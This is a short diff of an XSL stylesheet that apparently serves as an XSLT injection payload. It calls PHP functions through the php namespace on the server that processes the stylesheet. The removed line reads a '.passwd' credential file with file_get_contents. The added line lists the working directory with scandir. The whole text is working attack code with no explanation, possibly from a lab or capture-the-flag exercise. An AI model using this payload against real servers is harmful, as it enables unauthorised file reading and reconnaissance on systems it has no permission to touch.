@@ -4,7 +4,7 @@
       xmlns:php="http://php.net/xsl">
   <xsl:template match="/">
     <pre>
-<xsl:value-of select="php:function('file_get_contents', '.passwd')" />
+      <xsl:value-of select="php:function('serialize', php:function('scandir', '.'))"/>
     </pre>
   </xsl:template>
 </xsl:stylesheet>
